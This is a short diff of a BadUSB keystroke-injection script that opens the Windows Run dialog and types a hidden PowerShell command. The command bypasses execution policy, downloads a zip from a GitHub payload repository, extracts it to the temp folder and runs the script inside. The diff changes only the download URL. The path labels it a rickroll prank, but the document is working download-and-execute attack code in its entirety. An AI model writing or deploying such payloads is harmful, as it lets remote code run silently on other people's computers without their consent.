@@ -9,5 +9,5 @@ REM    -------------------------------------------------------------------------
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://raw.githubusercontent.com/ridicolos/payloads/main/badusb/windows/prank/rickroll/js.zip' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://github.com/ridicolos/payloads/raw/main/batusb/windows/prank/rickroll/js.zip' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
 ENTER
